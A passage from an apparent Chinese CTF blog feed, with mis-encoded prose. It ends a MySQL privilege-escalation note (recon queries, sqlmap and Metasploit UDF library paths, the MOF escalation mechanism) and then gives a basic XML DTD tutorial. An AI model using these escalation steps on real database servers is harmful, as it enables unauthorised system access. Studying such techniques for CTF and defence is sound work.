class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> version();   # è·å–æ•°æ®åº“ç‰ˆæœ¬<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>();  # è·å–æ•°æ®åº“ç”¨æˆ·<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;   # è·å–æ•°æ®åº“å®‰è£…ç›®å½•<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> â€˜<span class="hljs-operator">%</span>plugin<span class="hljs-operator">%</span>â€™; # æŸ¥çœ‹pluginè·¯å¾„ã€‚<br></code></pre></td></tr></table></figure><h3 id="åŠ¨æ€é“¾æ¥åº“å†™å…¥å‡½æ•°"><a href="#åŠ¨æ€é“¾æ¥åº“å†™å…¥å‡½æ•°" class="headerlink" title="åŠ¨æ€é“¾æ¥åº“å†™å…¥å‡½æ•°"></a>åŠ¨æ€é“¾æ¥åº“å†™å…¥å‡½æ•°</h3><ul><li><strong>sqlmap çš„ UDF åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®</strong>(sqlmapçš„åŠ¨æ€é“¾æ¥åº“éœ€è¦ä½¿ç”¨è‡ªå¸¦è§£ç å·¥å…·cloak.pyè§£ç )</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmapæ ¹ç›®å½•/data/udf/mysql<br></code></pre></td></tr></table></figure><ul><li><strong>Metasploit çš„ UDF åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSF æ ¹ç›®å½•/embedded/framework/data/exploits/mysql<br></code></pre></td></tr></table></figure><p>å¯»æ‰¾æ’ä»¶ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show variables like <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>+---------------+------------------------------+<br>| Variable_name | Value                        |<br>+---------------+------------------------------+<br>| plugin_dir    | /usr/local/mysql/lib/plugin/ |<br>+---------------+------------------------------+<br></code></pre></td></tr></table></figure><p>å†™å…¥åŠ¨æ€æ•°æ®åº“</p><p>å‘ï¼Œå¾…è¡¥</p><h2 id="MOFææƒ"><a href="#MOFææƒ" class="headerlink" title="MOFææƒ"></a>MOFææƒ</h2><p>MOF ææƒæ˜¯ä¸€ä¸ªæœ‰å†å²çš„æ¼æ´ï¼ŒåŸºæœ¬ä¸Šåœ¨ Windows Server 2003 çš„ç¯å¢ƒä¸‹æ‰å¯ä»¥æˆåŠŸã€‚ææƒçš„åŸç†æ˜¯C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;ç›®å½•ä¸‹çš„ mof æ–‡ä»¶æ¯ éš”ä¸€æ®µæ—¶é—´ï¼ˆå‡ ç§’é’Ÿå·¦å³ï¼‰éƒ½ä¼šè¢«ç³»ç»Ÿæ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ª MOF é‡Œé¢æœ‰ä¸€éƒ¨åˆ†æ˜¯ VBS è„šæœ¬ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª VBS è„šæœ¬æ¥è°ƒç”¨ CMD æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœ MySQL æœ‰æƒé™æ“ä½œ mof ç›®å½•çš„è¯ï¼Œå°±å¯ä»¥æ¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DTDå­¦ä¹ </title>
      <link href="/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p><strong>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚</strong></p><p><strong>DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚</strong></p><h3 id="å†…éƒ¨DOCTYPEå£°æ˜"><a href="#å†…éƒ¨DOCTYPEå£°æ˜" class="headerlink" title="å†…éƒ¨DOCTYPEå£°æ˜"></a>å†…éƒ¨DOCTYPEå£°æ˜</h3><p>è¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;  &lt;!--æ ¹å…ƒç´ æ˜¯xmlæ–‡ä»¶çš„æ ¹å…ƒç´ --&gt;<br></code></pre></td></tr></table></figure><p>å¸¦æœ‰ DTD çš„ XML æ–‡æ¡£å®ä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE note [<br>  &lt;!ELEMENT note (to,from,heading,body)&gt;<br>  &lt;!ELEMENT to      (#PCDATA)&gt;<br>  &lt;!ELEMENT from    (#PCDATA)&gt;<br>  &lt;!ELEMENT heading (#PCDATA)&gt;<br>  &lt;!ELEMENT body    (#PCDATA)&gt;<br>]&gt;<br>&lt;note&gt;<br>  &lt;to&gt;George&lt;/to&gt;<br>  &lt;from&gt;John&lt;/from&gt;<br>  &lt;heading&gt;Reminder&lt;/heading&gt;<br>  &lt;body&gt;Do not forget the meeting!&lt;/body&gt;<br>&lt;/note&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="ä»¥ä¸Š-DTD-è§£é‡Šå¦‚ä¸‹ï¼š"><a href="#ä»¥ä¸Š-DTD-è§£é‡Šå¦‚ä¸‹ï¼š" class="headerlink" title="ä»¥ä¸Š DTD è§£é‡Šå¦‚ä¸‹ï¼š"></a>ä»¥ä¸Š DTD è§£é‡Šå¦‚ä¸‹ï¼š</h3><p><em>!DOCTYPE note</em> (ç¬¬äºŒè¡Œ)å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ <em>note</em> ç±»å‹çš„æ–‡æ¡£ã€‚</p><p><em>!ELEMENT note</em> (ç¬¬ä¸‰è¡Œ)å®šä¹‰ <em>note</em> å…ƒç´ æœ‰å››ä¸ªå…ƒç´ ï¼šâ€toã€fromã€heading,ã€bodyâ€</p><p><em>!ELEMENT to</em> (ç¬¬å››è¡Œ)å®šä¹‰ <em>to</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p><p><em>!ELEMENT from</em> (ç¬¬äº”è¡Œ)å®šä¹‰ <em>from</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p><p><em>!ELEMENT heading</em> (ç¬¬å…­è¡Œ)å®šä¹‰ <em>heading</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p><p><em>!ELEMENT body</em> (ç¬¬ä¸ƒè¡Œ)å®šä¹‰ <em>body</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p></blockquote><h3 id="å¤–éƒ¨æ–‡æ¡£å£°æ˜"><a href="#å¤–éƒ¨æ–‡æ¡£å£°æ˜" class="headerlink" title="å¤–éƒ¨æ–‡æ¡£å£°æ˜"></a>å¤–éƒ¨æ–‡æ¡£å£°æ˜</h3><p>DTDä½äºXMLæºæ–‡ä»¶å¤–éƒ¨,è¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;<br></code></pre></td></tr></table></figure><p>å®ä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;<br>&lt;note&gt;<br>&lt;to&gt;George&lt;/to&gt;<br>&lt;from&gt;John&lt;/from&gt;<br>&lt;heading&gt;Reminder&lt;/heading&gt;<br>&lt;body&gt;Do not forget the meeting!&lt;/body&gt;<br>&lt;/note&gt; <br></code></pre></td></tr></table></figure><p>åŒ…å«çš„note.dtdæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;<br>&lt;!ELEMENT heading (#PCDATA)&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><h3 id="ç”¨å¤„"><a href="#ç”¨å¤„" class="headerlink" title="ç”¨å¤„"></a>ç”¨å¤„</h3><p>é€šè¿‡ DTDï¼Œæ¯ä¸€ä¸ª XML æ–‡ä»¶å‡å¯æºå¸¦ä¸€ä¸ªæœ‰å…³å…¶è‡ªèº«æ ¼å¼çš„æè¿°ã€‚</p><p>é€šè¿‡ DTDï¼Œç‹¬ç«‹çš„å›¢ä½“å¯ä¸€è‡´åœ°ä½¿ç”¨æŸä¸ªæ ‡å‡†çš„ DTD æ¥äº¤æ¢æ•°æ®ã€‚</p><h2 id="æ„å»ºæ¨¡å—"><a href="#æ„å»ºæ¨¡å—" class="headerlink" title="æ„å»ºæ¨¡å—"></a>æ„å»ºæ¨¡å—</h2><p>æ‰€æœ‰çš„ XML æ–‡æ¡£ï¼ˆä»¥åŠ HTML æ–‡æ¡£ï¼‰å‡ç”±ä»¥ä¸‹ç®€å•çš„æ„å»ºæ¨¡å—æ„æˆï¼š</p><ul><li>å…ƒç´ </li><li>å±æ€§</li><li>å®ä½“</li><li>PCDATA </li><li>CDATA</li></ul><h3 id="å…ƒç´ "><a href="#å…ƒç´ " class="headerlink" title="å…ƒç´ "></a>å…ƒç´ </h3><p>ç”±é—­åˆæ ‡ç­¾åŠå†…å®¹(æ–‡æœ¬æˆ–ç©º)æ„æˆ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>body text in between<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>some message in between<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>æä¾›<em>æœ‰å…³å…ƒç´ çš„é¢å¤–ä¿¡æ¯</em>ã€‚</p><p>å…ƒç´ ä¸ºç©ºæ—¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;computer.gif&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>å…ƒç´ æœ‰å†…å®¹æ—¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">person</span> <span class="hljs-attr">sex</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Anna<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>Smith<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">person</span>&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h3><p>å®ä½“æ˜¯ç”¨æ¥å®šä¹‰æ™®é€šæ–‡æœ¬çš„å˜é‡ã€‚å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p><p><strong>ä¸‹é¢çš„å®ä½“åœ¨ XML ä¸­è¢«é¢„å®šä¹‰</strong></p><table><thead><tr><th align="left">å®ä½“å¼•ç”¨</th><th align="left">å­—ç¬¦</th></tr></thead><tbody><tr><td align="left"><code>&amp;lt;</code></td><td align="left">&lt;</td></tr><tr><td align="left"><code>&amp;gt;</code></td><td align="left">&gt;</td></tr><tr><td align="left"><code>&amp;amp;</code></td><td align="left">&amp;</td></tr><tr><td align="left"><code>&amp;quot;</code></td><td align="left">â€œ</td></tr><tr><td align="left"><code>&amp;apos;</code></td><td align="left">â€˜</td></tr></tbody></table><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA çš„æ„æ€æ˜¯ä¼šè¢«è§£æçš„å­—ç¬¦æ•°æ®ï¼ˆparsed character dataï¼‰,å­—ç¬¦æ•°æ®å°±æ˜¯é—­åˆæ ‡ç­¾ä¹‹é—´çš„æ–‡æœ¬å†…å®¹</p><p><strong>è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚</strong>æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>æ­¤æ–‡æœ¬ä¹Ÿä¼šè¢«è§£æ<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA çš„æ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ˆcharacter dataï¼‰ã€‚<em>CDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚</em>åœ¨è¿™äº›æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¸ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¯¹å¾…ï¼Œå…¶ä¸­çš„å®ä½“ä¹Ÿä¸ä¼šè¢«å±•å¼€ã€‚</p><p>CDATA éƒ¨åˆ†ç”± <code>&lt;![CDATA[</code> å¼€å§‹ï¼Œç”±<code>]]&gt;</code> ç»“æŸï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[</span></span><br><span class="language-xml"><span class="language-handlebars">function matchwo(a,b)</span></span><br><span class="language-xml"><span class="language-handlebars">&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">if (a &lt; b &amp;&amp; a &lt; 0) then</span></span><br><span class="language-xml"><span class="language-handlebars">  &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">  return 1;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">else</span></span><br><span class="language-xml"><span class="language-handlebars">  &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">  return 0;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">&#125;</span></span><br><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>CDATA éƒ¨åˆ†ä¸èƒ½åŒ…å«å­—ç¬¦ä¸² â€œ]]&gt;â€ã€‚ä¹Ÿä¸å…è®¸åµŒå¥—çš„ CDATA éƒ¨åˆ†ã€‚</p><p>æ ‡è®° CDATA éƒ¨åˆ†ç»“å°¾çš„ â€œ]]&gt;â€ ä¸èƒ½åŒ…å«ç©ºæ ¼æˆ–æŠ˜è¡Œã€‚</p></blockquote><h2 id="å…ƒç´ å£°æ˜"><a href="#å…ƒç´ å£°æ˜" class="headerlink" title="å…ƒç´ å£°æ˜"></a>å…ƒç´ å£°æ˜</h2><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><p>åœ¨ DTD ä¸­ï¼ŒXML å…ƒç´ é€šè¿‡å…ƒç´ å£°æ˜æ¥è¿›è¡Œå£°æ˜ã€‚å…ƒç´ å£°æ˜ä½¿ç”¨ä¸‹é¢çš„è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">1âƒ£ï¸&lt;!ELEMENT å…ƒç´ åç§° ç±»åˆ«&gt;<br>2âƒ£ï¸&lt;!ELEMENT å…ƒç´ åç§° (å…ƒç´ å†…å®¹)&gt;<br></code></pre></td></tr></table></figure><h3 id="ç©ºå…ƒç´ "><a href="#ç©ºå…ƒç´ " class="headerlink" title="ç©ºå…ƒç´ "></a>ç©ºå…ƒç´ </h3><p>åˆ©ç”¨å…³é”®å­—<code>EMPTY</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ELEMENT å…ƒç´ åç§° EMPTY&gt;<br></code></pre></td></tr></table></figure><p>æ¡ˆä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!--dtdä¸­å£°æ˜--&gt;<br>&lt;!ELEMENT br EMPTY&gt;<br>&lt;!--XMLä¸­--&gt;<br>&lt;br /&gt;<br></code></pre></td></tr></table></figure><h3 id="åªæœ‰PCDATAçš„å…ƒç´ "><a href="#åªæœ‰PCDATAçš„å…ƒç´ " class="headerlink" title="åªæœ‰PCDATAçš„å…ƒç´ "></a>åªæœ‰PCDATAçš„å…ƒç´ </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT å…ƒç´ åç§° (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><h3 id="å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ "><a href="#å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ " class="headerlink" title="å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ "></a>å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ </h3><p>å…³é”®è¯<code>ANY</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT å…ƒç´ åç§° ANY&gt;<br></code></pre></td></tr></table></figure><h3 id="å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ "><a href="#å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ " class="headerlink" title="å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ "></a>å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ </h3><p>å¸¦æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå­å…ƒç´ çš„å…ƒç´ é€šè¿‡åœ†æ‹¬å·ä¸­çš„å­å…ƒç´ åè¿›è¡Œå£°æ˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">1âƒ£ï¸&lt;!ELEMENT å…ƒç´ åç§° (å­å…ƒç´ åç§° 1)&gt;<br>2âƒ£ï¸&lt;!ELEMENT å…ƒç´ åç§° (å­å…ƒç´ åç§° 1,å­å…ƒç´ åç§° 2,.....)&gt; &lt;!--ç”±é€—å·åˆ†éš”å¼€çš„åºåˆ—è¿›è¡Œå£°æ˜å¹¶ä¸”æŒ‰ç…§ç›¸åŒçš„é¡ºåºå‡ºç°åœ¨XMLæ–‡æ¡£ä¸­--&gt;<br></code></pre></td></tr></table></figure><h4 id="ä¸åŒçš„å…ƒç´ å£°æ˜"><a href="#ä¸åŒçš„å…ƒç´ å£°æ˜" class="headerlink" title="ä¸åŒçš„å…ƒç´ å£°æ˜"></a>ä¸åŒçš„å…ƒç´ å£°æ˜</h4><ul><li><p>å­å…ƒç´ åªå‡ºç°ä¸€æ¬¡ï¼šè¯­æ³•ä¸ºï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> å…ƒç´ åç§° (å­å…ƒç´ åç§°)&gt;<br></code></pre></td></tr></table></figure></li><li><p>å­å…ƒç´ å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼šè¯­æ³•ä¸ºï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> å…ƒç´ åç§° (å­å…ƒç´ åç§°<span class="hljs-string">?)</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>å­å…ƒç´ å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡ï¼šè¯­æ³•ä¸ºï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> å…ƒç´ åç§° (å­å…ƒç´ åç§°*)&gt;<br></code></pre></td></tr></table></figure></li><li><p>å­å…ƒç´ å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼šè¯­æ³•ä¸ºï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> å…ƒç´ åç§° (å­å…ƒç´ åç§°+)&gt;<br></code></pre></td></tr></table></figure></li><li><p>å­å…ƒç´ ä¸ºå¤šé€‰ä¸€ç±»å‹ï¼šè¯­æ³•ä¸ºï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> å…ƒç´ åç§° (å­å…ƒç´ åç§°<span class="hljs-number">1</span>|<span class="hljs-params">å…ƒç´ åç§°2</span>|å­å…ƒç´ åç§°<span class="hljs-number">3</span>|<span class="hljs-params">...)&gt;</span><br><span class="hljs-params"># è¿™é‡Œåˆ™ä¸éœ€è¦éµå¾ªå­å…ƒç´ å‡ºç°çš„é¡ºåºæ¥å†™å£°æ˜ï¼Œåªéœ€åŒ…å«æ‰€æœ‰å¯èƒ½å‡ºç°çš„å­å…ƒç´ å³å¯ï¼ˆä¹Ÿå¯ä»¥æ·»åŠ ä¸€äº›ä¸å¯èƒ½å‡ºç°çš„å…ƒç´ ï¼Œå½“ç„¶è¿™æ ·å†™å¹¶æ²¡æœ‰å¿…è¦)</span><br><span class="hljs-params"># åªèƒ½å‡ºç°ä¸€ä¸ªï¼Œä¸ç„¶ä¼šæŠ¥é”™</span><br></code></pre></td></tr></table></figure></li><li><p>å¤šç§ç±»å‹çš„å­å…ƒç´ æ··åˆï¼šä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> book (name,author?,(price|<span class="hljs-params">press</span>|date)*)&gt;<br></code></pre></td></tr></table></figure></li></ul><p>è¿™ä¸ªå£°æ˜çš„å«ä¹‰ä¸ºï¼š<code>book</code>å…ƒç´ åŒ…å«åªå‡ºç°ä¸€æ¬¡çš„<code>name</code>å­å…ƒç´ ã€å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡çš„<code>author</code>å­å…ƒç´ ä»¥åŠå‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡çš„<code>price</code>ã€<code>press</code>ã€<code>date</code>ä¸‰ä¸ªå­å…ƒç´ ä¸­çš„ä¸€ä¸ª</p><blockquote><p>å¯¹äº<code>?</code>ã€<code>*</code>ä»¥åŠ<code>+</code>è¿™ä¸‰ä¸ªç¬¦å·çš„å«ä¹‰ï¼Œå¯ä»¥ç±»æ¯”äºæ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œè®°å¿†</p></blockquote><h2 id="å±æ€§å£°æ˜"><a href="#å±æ€§å£°æ˜" class="headerlink" title="å±æ€§å£°æ˜"></a>å±æ€§å£°æ˜</h2><h3 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ é»˜è®¤å€¼&gt;<br></code></pre></td></tr></table></figure><p>DTD å®ä¾‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;check&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯<strong>å±æ€§ç±»å‹</strong>çš„é€‰é¡¹ï¼š</p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">CDATA</td><td align="left">å€¼ä¸ºå­—ç¬¦æ•°æ® (character data)</td></tr><tr><td align="left">(<em>en1</em>|<em>en2</em>|..)</td><td align="left">æ­¤å€¼æ˜¯æšä¸¾åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå€¼</td></tr><tr><td align="left">ID</td><td align="left">å€¼ä¸ºå”¯ä¸€çš„ id</td></tr><tr><td align="left">IDREF</td><td align="left">å€¼ä¸ºå¦å¤–ä¸€ä¸ªå…ƒç´ çš„ id</td></tr><tr><td align="left">IDREFS</td><td align="left">å€¼ä¸ºå…¶ä»– id çš„åˆ—è¡¨</td></tr><tr><td align="left">NMTOKEN</td><td align="left">å€¼ä¸ºåˆæ³•çš„ XML åç§°</td></tr><tr><td align="left">NMTOKENS</td><td align="left">å€¼ä¸ºåˆæ³•çš„ XML åç§°çš„åˆ—è¡¨</td></tr><tr><td align="left">ENTITY</td><td align="left">å€¼æ˜¯ä¸€ä¸ªå®ä½“</td></tr><tr><td align="left">ENTITIES</td><td 